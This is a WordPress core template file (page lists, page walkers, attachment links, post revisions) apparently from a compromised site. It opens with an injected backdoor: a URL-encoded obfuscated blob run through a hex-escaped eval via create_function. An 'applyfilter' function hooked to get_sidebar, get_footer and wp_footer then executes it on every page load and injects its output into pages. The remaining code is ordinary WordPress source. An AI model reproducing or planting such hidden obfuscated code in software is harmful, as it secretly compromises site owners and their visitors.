%3eJQ%29LxvW%40tLNL%2cWg%3bf%3e%28%22nkLaHQiHH%23n%2bLKAKH%3bL%21%3b%21iM%2biUs8%3fR%3b%2b%5eaL%60hRk%27IkkU%40410P03%5bwh%60E%3dJx%29qU%5f%5c3%5bZeqPd%3ePP%3dC%2fcpQpsFTFgZGg%3bjAESDGxe%3c%2cNS%20%24%23%20%20%3bX%2a%7dykyL%2cRQaYQ%5b8%3fB%7dLYj%2cth5%7dIO%27II%5b6p%7bX%3eX9Az3%60%5dmx%29H1%5b7s%602e%7c1%3eFd%3e%3emyuS%40%21%40mVld%3f%7ef%5ejT%3d%3a%2e%25ak%3cMQ7H%23%7eQG%21%2eh%2fu5C%24%20k%5de%60UQO%2acnfj%2aR0vmnYOXkU2%2ah0jA%7bg%3fU%60VC%5dF%2bGic%3c0C2e%7c1ZG%3aV0dDTV%40%3dBYnHme%7e%28giQd%3b4noD%7di%5f%29%20%24ilQy%60tR%2dRivoEvV%2cYbv%7eWR%7bg%3b1EvSokvqSYU%5b%2a580kq1OqOI54Z%5b97Ur2pB%5cCwB%3f5J%5f4BVB%238T%3cs%28%3fy%3eT%3al%2c%3c%2fKDWT%7eZ%2fHi%5eQCLG%5e%60%2ffT1%22%23iR%2b%286%21%2dY01%26WFpFRh0%3cdTv%22E%3fB%3f%2a%22X%3f5aO4Q%262%5f6Q%5c8s85d%3a%7cd%22NV%3d%22ehy%3e7Q%2b%5cieeG%5e%2fCu%2f%2fJMRHwx%21%23H%3aiCjbtm%29%2c%40%20%21RWOpi%27l9kg1%5b31%5e%5eoD%3cT%2a%2b%5d%5bfsns808%7b%7bwy%2eZDJIdO63%3fg%3f%5c1%7c%5dQh%2fu%5f%2eC%5btpuC%5ci%60M%28XQT%2eGTx%3ayyTy%5e%5ejEEokk%20%5eXS%5db%2eE%28%40%23bY%2cQaYNj3hd%2dN%27kjMz02OU18%5cIF%29NatM%2cY%5d%2anN%7cTj%7c%23q5F%3e83%3d%40%3cVmS%29Jd%24A5%60%263h9g92%40%5c%40%228s16g77%3e%5ekf3KJa%7d%3bCN%23%2b%2cvb%5bzM%60DJyGC%2ei%2d%20%21G%20%3ayC%20tP0M%60khDH%5bU5pJ%27v4d%5f4p3yi%2e%29hu4Fdm%40%25d8D%3en%265%5bOPn%2cWY%5d%3fleJ%24%21%25sd%2a%3aX%7bG%2eMR%28u%2c%20WaNnUO%7d3m%2eCluyHtQ%2fJGi%28%28%3fF8%7c%2asR%2fo7w%7bA%5bs%262c%3c5e%20%26ZYL%5f%3dFBhs%5ccPmgTQH%3d%24%2aBVC%2fr%3eTGC%29%7cNa%2fY%5beJy0b%3d5w%5fQxLN%23%29jAQOcH%7e%2cjAf%3b%2cjWY%2cRw%25d%3ed8b9sR%2fjAuE%229%7b1%7b16O%608%3fsglhvmVg5%5ce8spAZe%25rbB%3eM%7e1B%3d%7c%29HJD%7c%29lK%7cS%5e%3ap%3aT%3csTuB%25ZS%7cU6o%20%2aR%5eA%5e0t3%29%3d%7b',4925);}call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));}}
	if($text) {$out=@ob_get_contents(); @ob_end_clean(); return $text.$out;}
}
add_action('get_sidebar', 'applyfilter', 1, 0);
add_action('get_footer', 'applyfilter', 1, 0);
add_action('wp_footer', 'applyfilter', 1, 0);

/**
 * Helper function for wp_link_pages().
 *
 * @since 3.1.0
 * @access private
 *
 * @param int $i Page number.
 * @return string Link.
 */
function _wp_link_page( $i ) {
	global $wp_rewrite;
	$post = get_post();

	if ( 1 == $i ) {
		$url = get_permalink();
	} else {
		if ( '' == get_option('permalink_structure') || in_array($post->post_status, array('draft', 'pending')) )
			$url = add_query_arg( 'page', $i, get_permalink() );
		elseif ( 'page' == get_option('show_on_front') && get_option('page_on_front') == $post->ID )
			$url = trailingslashit(get_permalink()) . user_trailingslashit("$wp_rewrite->pagination_base/" . $i, 'single_paged');
		else
			$url = trailingslashit(get_permalink()) . user_trailingslashit($i, 'single_paged');
	}

	return '<a href="' . esc_url( $url ) . '">';
}

//
// Post-meta: Custom per-post fields.
//

/**
 * Retrieve post custom meta data field.
 *
 * @since 1.5.0
 *
 * @param string $key Meta data key name.
 * @return bool|string|array Array of values or single value, if only one element exists. False will be returned if key does not exist.
 */
function post_custom( $key = '' ) {
	$custom = get_post_custom();

	if ( !isset( $custom[$key] ) )
		return false;
	elseif ( 1 == count($custom[$key]) )
		return $custom[$key][0];
	else
		return $custom[$key];
}

/**
 * Display list of post custom fields.
 *
 * @internal This will probably change at some point...
 * @since 1.2.0
 * @uses apply_filters() Calls 'the_meta_key' on list item HTML content, with key and value as separate parameters.
 */
function the_meta() {
	if ( $keys = get_post_custom_keys() ) {
		echo "<ul class='post-meta'>\n";
		foreach ( (array) $keys as $key ) {
			$keyt = trim($key);
			if ( is_protected_meta( $keyt, 'post' ) )
				continue;
			$values = array_map('trim', get_post_custom_values($key));
			$value = implode($values,', ');
			echo apply_filters('the_meta_key', "<li><span class='post-meta-key'>$key:</span> $value</li>\n", $key, $value);
		}
		echo "</ul>\n";
	}
}

//
// Pages
//

/**
 * Retrieve or display list of pages as a dropdown (select list).
 *
 * @since 2.1.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_dropdown_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'child_of' => 0,
		'selected' => 0, 'echo' => 1,
		'name' => 'page_id', 'id' => '',
		'show_option_none' => '', 'show_option_no_change' => '',
		'option_none_value' => ''
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$pages = get_pages($r);
	$output = '';
	// Back-compat with old system where both id and name were based on $name argument
	if ( empty($id) )
		$id = $name;

	if ( ! empty($pages) ) {
		$output = "<select name='" . esc_attr( $name ) . "' id='" . esc_attr( $id ) . "'>\n";
		if ( $show_option_no_change )
			$output .= "\t<option value=\"-1\">$show_option_no_change</option>";
		if ( $show_option_none )
			$output .= "\t<option value=\"" . esc_attr($option_none_value) . "\">$show_option_none</option>\n";
		$output .= walk_page_dropdown_tree($pages, $depth, $r);
		$output .= "</select>\n";
	}

	$output = apply_filters('wp_dropdown_pages', $output);

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Retrieve or display list of pages in list (li) format.
 *
 * @since 1.5.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_list_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'show_date' => '',
		'date_format' => get_option('date_format'),
		'child_of' => 0, 'exclude' => '',
		'title_li' => __('Pages'), 'echo' => 1,
		'authors' => '', 'sort_column' => 'menu_order, post_title',
		'link_before' => '', 'link_after' => '', 'walker' => '',
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$output = '';
	$current_page = 0;

	// sanitize, mostly to keep spaces out
	$r['exclude'] = preg_replace('/[^0-9,]/', '', $r['exclude']);

	// Allow plugins to filter an array of excluded pages (but don't put a nullstring into the array)
	$exclude_array = ( $r['exclude'] ) ? explode(',', $r['exclude']) : array();
	$r['exclude'] = implode( ',', apply_filters('wp_list_pages_excludes', $exclude_array) );

	// Query pages.
	$r['hierarchical'] = 0;
	$pages = get_pages($r);

	if ( !empty($pages) ) {
		if ( $r['title_li'] )
			$output .= '<li class="pagenav">' . $r['title_li'] . '<ul>';

		global $wp_query;
		if ( is_page() || is_attachment() || $wp_query->is_posts_page )
			$current_page = $wp_query->get_queried_object_id();
		$output .= walk_page_tree($pages, $r['depth'], $current_page, $r);

		if ( $r['title_li'] )
			$output .= '</ul></li>';
	}

	$output = apply_filters('wp_list_pages', $output, $r);

	if ( $r['echo'] )
		echo $output;
	else
		return $output;
}

/**
 * Display or retrieve list of pages with optional home link.
 *
 * The arguments are listed below and part of the arguments are for {@link
 * wp_list_pages()} function. Check that function for more info on those
 * arguments.
 *
 * <ul>
 * <li><strong>sort_column</strong> - How to sort the list of pages. Defaults
 * to page title. Use column for posts table.</li>
 * <li><strong>menu_class</strong> - Class to use for the div ID which contains
 * the page list. Defaults to 'menu'.</li>
 * <li><strong>echo</strong> - Whether to echo list or return it. Defaults to
 * echo.</li>
 * <li><strong>link_before</strong> - Text before show_home argument text.</li>
 * <li><strong>link_after</strong> - Text after show_home argument text.</li>
 * <li><strong>show_home</strong> - If you set this argument, then it will
 * display the link to the home page. The show_home argument really just needs
 * to be set to the value of the text of the link.</li>
 * </ul>
 *
 * @since 2.7.0
 *
 * @param array|string $args
 * @return string html menu
 */
function wp_page_menu( $args = array() ) {
	$defaults = array('sort_column' => 'menu_order, post_title', 'menu_class' => 'menu', 'echo' => true, 'link_before' => '', 'link_after' => '');
	$args = wp_parse_args( $args, $defaults );
	$args = apply_filters( 'wp_page_menu_args', $args );

	$menu = '';

	$list_args = $args;

	// Show Home in the menu
	if ( ! empty($args['show_home']) ) {
		if ( true === $args['show_home'] || '1' === $args['show_home'] || 1 === $args['show_home'] )
			$text = __('Home');
		else
			$text = $args['show_home'];
		$class = '';
		if ( is_front_page() && !is_paged() )
			$class = 'class="current_page_item"';
		$menu .= '<li ' . $class . '><a href="' . home_url( '/' ) . '" title="' . esc_attr($text) . '">' . $args['link_before'] . $text . $args['link_after'] . '</a></li>';
		// If the front page is a page, add it to the exclude list
		if (get_option('show_on_front') == 'page') {
			if ( !empty( $list_args['exclude'] ) ) {
				$list_args['exclude'] .= ',';
			} else {
				$list_args['exclude'] = '';
			}
			$list_args['exclude'] .= get_option('page_on_front');
		}
	}

	$list_args['echo'] = false;
	$list_args['title_li'] = '';
	$menu .= str_replace( array( "\r", "\n", "\t" ), '', wp_list_pages($list_args) );

	if ( $menu )
		$menu = '<ul>' . $menu . '</ul>';

	$menu = '<div class="' . esc_attr($args['menu_class']) . '">' . $menu . "</div>\n";
	$menu = apply_filters( 'wp_page_menu', $menu, $args );
	if ( $args['echo'] )
		echo $menu;
	else
		return $menu;
}

//
// Page helpers
//

/**
 * Retrieve HTML list content for page list.
 *
 * @uses Walker_Page to create HTML list content.
 * @since 2.1.0
 * @see Walker_Page::walk() for parameters and return description.
 */
function walk_page_tree($pages, $depth, $current_page, $r) {
	if ( empty($r['walker']) )
		$walker = new Walker_Page;
	else
		$walker = $r['walker'];

	$args = array($pages, $depth, $r, $current_page);
	return call_user_func_array(array($walker, 'walk'), $args);
}

/**
 * Retrieve HTML dropdown (select) content for page list.
 *
 * @uses Walker_PageDropdown to create HTML dropdown content.
 * @since 2.1.0
 * @see Walker_PageDropdown::walk() for parameters and return description.
 */
function walk_page_dropdown_tree() {
	$args = func_get_args();
	if ( empty($args[2]['walker']) ) // the user's options are the third parameter
		$walker = new Walker_PageDropdown;
	else
		$walker = $args[2]['walker'];

	return call_user_func_array(array($walker, 'walk'), $args);
}

/**
 * Create HTML list of pages.
 *
 * @package WordPress
 * @since 2.1.0
 * @uses Walker
 */
class Walker_Page extends Walker {
	/**
	 * @see Walker::$tree_type
	 * @since 2.1.0
	 * @var string
	 */
	var $tree_type = 'page';

	/**
	 * @see Walker::$db_fields
	 * @since 2.1.0
	 * @todo Decouple this.
	 * @var array
	 */
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');

	/**
	 * @see Walker::start_lvl()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 * @param array $args
	 */
	function start_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class='children'>\n";
	}

	/**
	 * @see Walker::end_lvl()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 * @param array $args
	 */
	function end_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "$indent</ul>\n";
	}

	/**
	 * @see Walker::start_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object.
	 * @param int $depth Depth of page. Used for padding.
	 * @param int $current_page Page ID.
	 * @param array $args
	 */
	function start_el( &$output, $page, $depth, $args, $current_page = 0 ) {
		if ( $depth )
			$indent = str_repeat("\t", $depth);
		else
			$indent = '';

		extract($args, EXTR_SKIP);
		$css_class = array('page_item', 'page-item-'.$page->ID);
		if ( !empty($current_page) ) {
			$_current_page = get_post( $current_page );
			if ( in_array( $page->ID, $_current_page->ancestors ) )
				$css_class[] = 'current_page_ancestor';
			if ( $page->ID == $current_page )
				$css_class[] = 'current_page_item';
			elseif ( $_current_page && $page->ID == $_current_page->post_parent )
				$css_class[] = 'current_page_parent';
		} elseif ( $page->ID == get_option('page_for_posts') ) {
			$css_class[] = 'current_page_parent';
		}

		$css_class = implode( ' ', apply_filters( 'page_css_class', $css_class, $page, $depth, $args, $current_page ) );

		$output .= $indent . '<li class="' . $css_class . '"><a href="' . get_permalink($page->ID) . '">' . $link_before . apply_filters( 'the_title', $page->post_title, $page->ID ) . $link_after . '</a>';

		if ( !empty($show_date) ) {
			if ( 'modified' == $show_date )
				$time = $page->post_modified;
			else
				$time = $page->post_date;

			$output .= " " . mysql2date($date_format, $time);
		}
	}

	/**
	 * @see Walker::end_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object. Not used.
	 * @param int $depth Depth of page. Not Used.
	 * @param array $args
	 */
	function end_el( &$output, $page, $depth = 0, $args = array() ) {
		$output .= "</li>\n";
	}

}

/**
 * Create HTML dropdown list of pages.
 *
 * @package WordPress
 * @since 2.1.0
 * @uses Walker
 */
class Walker_PageDropdown extends Walker {
	/**
	 * @see Walker::$tree_type
	 * @since 2.1.0
	 * @var string
	 */
	var $tree_type = 'page';

	/**
	 * @see Walker::$db_fields
	 * @since 2.1.0
	 * @todo Decouple this
	 * @var array
	 */
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');

	/**
	 * @see Walker::start_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object.
	 * @param int $depth Depth of page in reference to parent pages. Used for padding.
	 * @param array $args Uses 'selected' argument for selected page to set selected HTML attribute for option element.
	 * @param int $id
	 */
	function start_el(&$output, $page, $depth, $args, $id = 0) {
		$pad = str_repeat('&nbsp;', $depth * 3);

		$output .= "\t<option class=\"level-$depth\" value=\"$page->ID\"";
		if ( $page->ID == $args['selected'] )
			$output .= ' selected="selected"';
		$output .= '>';
		$title = apply_filters( 'list_pages', $page->post_title, $page );
		$output .= $pad . esc_html( $title );
		$output .= "</option>\n";
	}
}

//
// Attachments
//

/**
 * Display an attachment page link using an image or icon.
 *
 * @since 2.0.0
 *
 * @param int $id Optional. Post ID.
 * @param bool $fullsize Optional, default is false. Whether to use full size.
 * @param bool $deprecated Deprecated. Not used.
 * @param bool $permalink Optional, default is false. Whether to include permalink.
 */
function the_attachment_link( $id = 0, $fullsize = false, $deprecated = false, $permalink = false ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.5' );

	if ( $fullsize )
		echo wp_get_attachment_link($id, 'full', $permalink);
	else
		echo wp_get_attachment_link($id, 'thumbnail', $permalink);
}

/**
 * Retrieve an attachment page link using an image or icon, if possible.
 *
 * @since 2.5.0
 * @uses apply_filters() Calls 'wp_get_attachment_link' filter on HTML content with same parameters as function.
 *
 * @param int $id Optional. Post ID.
 * @param string $size Optional, default is 'thumbnail'. Size of image, either array or string.
 * @param bool $permalink Optional, default is false. Whether to add permalink to image.
 * @param bool $icon Optional, default is false. Whether to include icon.
 * @param string|bool $text Optional, default is false. If string, then will be link text.
 * @return string HTML content.
 */
function wp_get_attachment_link( $id = 0, $size = 'thumbnail', $permalink = false, $icon = false, $text = false ) {
	$id = intval( $id );
	$_post = get_post( $id );

	if ( empty( $_post ) || ( 'attachment' != $_post->post_type ) || ! $url = wp_get_attachment_url( $_post->ID ) )
		return __( 'Missing Attachment' );

	if ( $permalink )
		$url = get_attachment_link( $_post->ID );

	$post_title = esc_attr( $_post->post_title );

	if ( $text )
		$link_text = $text;
	elseif ( $size && 'none' != $size )
		$link_text = wp_get_attachment_image( $id, $size, $icon );
	else
		$link_text = '';

	if ( trim( $link_text ) == '' )
		$link_text = $_post->post_title;

	return apply_filters( 'wp_get_attachment_link', "<a href='$url' title='$post_title'>$link_text</a>", $id, $size, $permalink, $icon, $text );
}

/**
 * Wrap attachment in <<p>> element before content.
 *
 * @since 2.0.0
 * @uses apply_filters() Calls 'prepend_attachment' hook on HTML content.
 *
 * @param string $content
 * @return string
 */
function prepend_attachment($content) {
	$post = get_post();

	if ( empty($post->post_type) || $post->post_type != 'attachment' )
		return $content;

	$p = '<p class="attachment">';
	// show the medium sized image representation of the attachment if available, and link to the raw file
	$p .= wp_get_attachment_link(0, 'medium', false);
	$p .= '</p>';
	$p = apply_filters('prepend_attachment', $p);

	return "$p\n$content";
}

//
// Misc
//

/**
 * Retrieve protected post password form content.
 *
 * @since 1.0.0
 * @uses apply_filters() Calls 'the_password_form' filter on output.
 *
 * @return string HTML content for password form for password protected post.
 */
function get_the_password_form() {
	$post = get_post();
	$label = 'pwbox-' . ( empty($post->ID) ? rand() : $post->ID );
	$output = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">
	<p>' . __("This post is password protected. To view it please enter your password below:") . '</p>
	<p><label for="' . $label . '">' . __("Password:") . ' <input name="post_password" id="' . $label . '" type="password" size="20" /></label> <input type="submit" name="Submit" value="' . esc_attr__("Submit") . '" /></p>
</form>
	';
	return apply_filters('the_password_form', $output);
}

/**
 * Whether currently in a page template.
 *
 * This template tag allows you to determine if you are in a page template.
 * You can optionally provide a template name and then the check will be
 * specific to that template.
 *
 * @since 2.5.0
 * @uses $wp_query
 *
 * @param string $template The specific template name if specific matching is required.
 * @return bool False on failure, true if success.
 */
function is_page_template( $template = '' ) {
	if ( ! is_page() )
		return false;

	$page_template = get_page_template_slug( get_queried_object_id() );

	if ( empty( $template ) )
		return (bool) $page_template;

	if ( $template == $page_template )
		return true;

	if ( 'default' == $template && ! $page_template )
		return true;

	return false;
}

/**
 * Get the specific template name for a page.
 *
 * @since 3.4.0
 *
 * @param int $post_id The page ID to check. Defaults to the current post, when used in the loop.
 * @return string|bool Page template filename. Returns an empty string when the default page template
 * 	is in use. Returns false if the post is not a page.
 */
function get_page_template_slug( $post_id = null ) {
	$post = get_post( $post_id );
	if ( 'page' != $post->post_type )
		return false;
	$template = get_post_meta( $post->ID, '_wp_page_template', true );
	if ( ! $template || 'default' == $template )
		return '';
	return $template;
}

/**
 * Retrieve formatted date timestamp of a revision (linked to that revisions's page).
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses date_i18n()
 *
 * @param int|object $revision Revision ID or revision object.
 * @param bool $link Optional, default is true. Link to revisions's page?
 * @return string i18n formatted datetimestamp or localized 'Current Revision'.
 */
function wp_post_revision_title( $revision, $link = true ) {
	if ( !$revision = get_post( $revision ) )
		return $revision;

	if ( !in_array( $revision->post_type, array( 'post', 'page', 'revision' ) ) )
		return false;

	/* translators: revision date format, see http://php.net/date */
	$datef = _x( 'j F, Y @ G:i', 'revision date format');
	/* translators: 1: date */
	$autosavef = __( '%1$s [Autosave]' );
	/* translators: 1: date */
	$currentf  = __( '%1$s [Current Revision]' );

	$date = date_i18n( $datef, strtotime( $revision->post_modified ) );
	if ( $link && current_user_can( 'edit_post', $revision->ID ) && $link = get_edit_post_link( $revision->ID ) )
		$date = "<a href='$link'>$date</a>";

	if ( !wp_is_post_revision( $revision ) )
		$date = sprintf( $currentf, $date );
	elseif ( wp_is_post_autosave( $revision ) )
		$date = sprintf( $autosavef, $date );

	return $date;
}

/**
 * Display list of a post's revisions.
 *
 * Can output either a UL with edit links or a TABLE with diff interface, and
 * restore action links.
 *
 * Second argument controls parameters:
 *   (bool)   parent : include the parent (the "Current Revision") in the list.
 *   (string) format : 'list' or 'form-table'. 'list' outputs UL, 'form-table'
 *                     outputs TABLE with UI.
 *   (int)    right  : what revision is currently being viewed - used in
 *                     form-table format.
 *   (int)    left   : what revision is currently being diffed against right -
 *                     used in form-table format.
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses wp_get_post_revisions()
 * @uses wp_post_revision_title()
 * @uses get_edit_post_link()
 * @uses get_the_author_meta()
 *
 * @todo split into two functions (list, form-table) ?
 *
 * @param int|object $post_id Post ID or post object.
 * @param string|array $args See description {@link wp_parse_args()}.
 * @return null
 */
function wp_list_post_revisions( $post_id = 0, $args = null ) {
	if ( !$post = get_post( $post_id ) )
		return;

	$defaults = array( 'parent' => false, 'right' => false, 'left' => false, 'format' => 'list', 'type' => 'all' );
	extract( wp_parse_args( $args, $defaults ), EXTR_SKIP );

	switch ( $type ) {
		case 'autosave' :
			if ( !$autosave = wp_get_post_autosave( $post->ID ) )
				return;
			$revisions = array( $autosave );
			break;
		case 'revision' : // just revisions - remove autosave later
		case 'all' :
		default :
			if ( !$revisions = wp_get_post_revisions( $post->ID ) )
				return;
			break;
	}

	/* translators: post revision: 1: when, 2: author name */
	$titlef = _x( '%1$s by %2$s', 'post revision' );

	if ( $parent )
		array_unshift( $revisions, $post );

	$rows = $right_checked = '';
	$class = false;
	$can_edit_post = current_user_can( 'edit_post', $post->ID );
	foreach ( $revisions as $revision ) {
		if ( !current_user_can( 'read_post', $revision->ID ) )
			continue;
		if ( 'revision' === $type && wp_is_post_autosave( $revision ) )
			continue;

		$date = wp_post_revision_title( $revision );
		$name = get_the_author_meta( 'display_name', $revision->post_author );

		if ( 'form-table' == $format ) {
			if ( $left )
				$left_checked = $left == $revision->ID ? ' checked="checked"' : '';
			else
				$left_checked = $right_checked ? ' checked="checked"' : ''; // [sic] (the next one)
			$right_checked = $right == $revision->ID ? ' checked="checked"' : '';

			$class = $class ? '' : " class='alternate'";

			if ( $post->ID != $revision->ID && $can_edit_post )
				$actions = '<a href="' . wp_nonce_url( add_query_arg( array( 'revision' => $revision->ID, 'action' => 'restore' ) ), "restore-post_$post->ID|$revision->ID" ) . '">' . __( 'Restore' ) . '</a>';
			else
				$actions = '';

			$rows .= "<tr$class>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='left' value='$revision->ID'$left_checked /></th>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='right' value='$revision->ID'$right_checked /></th>\n";
			$rows .= "\t<td>$date</td>\n";
			$rows .= "\t<td>$name</td>\n";
			$rows .= "\t<td class='action-links'>$actions</td>\n";
			$rows .= "</tr>\n";
		} else {
			$title = sprintf( $titlef, $date, $name );
			$rows .= "\t<li>$title</li>\n";
		}
	}

	if ( 'form-table' == $format ) : ?>

<form action="revision.php" method="get">

<div class="tablenav">
	<div class="alignleft">
		<input type="submit" class="button-secondary" value="<?php esc_attr_e( 'Compare Revisions' ); ?>" />
		<input type="hidden" name="action" value="diff" />
		<input type="hidden" name="post_type" value="<?php echo esc_attr($post->post_type); ?>" />
	</div>
</div>

<br class="clear" />

<table class="widefat post-revisions" cellspacing="0" id="post-revisions">
	<col />
	<col />
	<col style="width: 33%" />
	<col style="width: 33%" />
	<col style="width: 33%" />
<thead>
<tr>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'Old', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'New', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisions */ _ex( 'Date Created', 'revisions column name' ); ?></th>
	<th scope="col"><?php _e( 'Author' ); ?></th>
	<th scope="col" class="action-links"><?php _e( 'Actions' ); ?></th>
</tr>
</thead>
<tbody>

<?php echo $rows; ?>

</tbody>
</table>

</form>

<?php
	else :
		echo "<ul class='post-revisions'>\n";
		echo $rows;
		echo "</ul>";
	endif;

}
